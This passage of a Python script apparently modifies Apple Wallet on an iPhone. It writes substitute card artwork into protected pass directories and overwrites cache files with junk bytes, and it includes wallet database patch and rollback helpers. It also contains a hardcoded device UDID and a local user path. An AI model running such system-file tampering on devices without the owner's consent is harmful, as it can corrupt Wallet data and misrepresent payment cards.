            rollback_wallet_db_patch(udid, prepared)
        except RuntimeError as rollback_error:
            raise RuntimeError(f"{error}; {rollback_error}") from error
        raise RuntimeError(
            f"{error}; wallet database rollback verified"
        ) from error


def apply_wallet_db_patch(udid: str, prepared: dict) -> dict:
    """Apply one card patch with the shared batch write path."""
    return apply_wallet_db_batch_patch(udid, prepared)[0]


def inspect_wallet_db(udid: str, card_hash: str) -> dict:
    """Extract and inspect the Wallet pass database without modifying it."""
    validate_card_hash(card_hash)
    database = _extract_wallet_db_main_without_sidecars(udid, "inspect")
    inspected = inspect_wallet_db_bytes(database, card_hash)
    return {
        "fileSizes": {
            WALLET_DB_LEAF: len(database),
            "passes23.sqlite-journal": None,
            "passes23.sqlite-wal": None,
            "passes23.sqlite-shm": None,
        },
        "sidecars": {"journal": False, "wal": False, "shm": False},
        **inspected,
    }


def invalidate_cache(udid: str, card_hash: str) -> bool:
    """Invalidates card image cache by corrupting cache leaves in .cache and .pkcache."""
    any_ok = False
    cache_leaves = [("FrontFace", b"corrupted"), ("PlaceHolder", b"corrupted"), ("Preview", b"corrupted")]
    for ext in [".cache", ".pkcache"]:
        cache_dir = f"/var/mobile/Library/Passes/Cards/{card_hash}{ext}"
        try:
            if write_files_batch(udid, cache_dir, cache_leaves):
                any_ok = True
            else:
                for leaf, payload in cache_leaves:
                    if write_file(udid, cache_dir, leaf, payload):
                        any_ok = True
        except Exception:
            pass
    return any_ok


def main():
    udid = "00008120-001A1D0A1EE9A01E"
    batter_path = Path("/Users/mak5er/Downloads/CardChanger.batter")
    if not batter_path.is_file():
        print(f"Error: {batter_path} not found")
        sys.exit(1)

    with zipfile.ZipFile(batter_path, "r") as z:
        img_data = z.read("CardChanger/container/RENAME_ME.pkpass/cardBackgroundCombined@2x.png")

    hashes = [
        "OM6NYhwXMZrAw0sRUjR62wmF4ZQ=",
        "M6nDwZrkYbFlsodLgCbvyFZQ1cc=",
        "kJL-D0rr-SZhbj2c8nK-OQ9hCMY=",
        "hwAtAmHKYwsQrJbT5cTNDsaxVME=",
    ]

    print(f"Loaded image from batter: {len(img_data)} bytes")
    print(f"Targeting {len(hashes)} cards on device {udid}...")

    for index, h in enumerate(hashes, 1):
        target_dir = f"/var/mobile/Library/Passes/Cards/{h}.pkpass"
        print(f"\n[{index}/{len(hashes)}] Processing card: {h}")

        print("  -> Writing card artwork (fast batch)...")
        card_assets = [
            ("cardBackgroundCombined@3x.png", img_data),
            ("cardBackgroundCombined@2x.png", img_data),
        ]
        ok_batch = write_files_batch(udid, target_dir, card_assets)
        if not ok_batch:
            ok3x = write_file(udid, target_dir, "cardBackgroundCombined@3x.png", img_data)
            ok2x = write_file(udid, target_dir, "cardBackgroundCombined@2x.png", img_data)
            ok_batch = ok3x and ok2x
        print(f"     Result: {'SUCCESS' if ok_batch else 'FAILED'}")

        print("  -> Invalidating pass cache...")
        ok_cache = invalidate_cache(udid, h)
        print(f"     Result: {'SUCCESS' if ok_cache else 'FAILED (or cache already empty)'}")

    print("\nAll done! Please force close Wallet on your iPhone and reopen it.")


if __name__ == "__main__":
    main()
